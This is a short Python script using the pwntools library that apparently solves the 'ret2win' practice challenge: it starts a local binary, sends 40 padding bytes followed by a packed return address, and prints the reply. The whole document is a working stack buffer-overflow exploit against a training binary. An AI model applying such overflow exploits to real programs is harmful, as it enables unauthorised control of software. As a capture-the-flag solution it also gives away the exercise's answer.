from pwn import *
import time
p=process("./ret2win")
p.sendline(b"a"*40+p64(0x00400756))
time.sleep(1)
print(p.recv())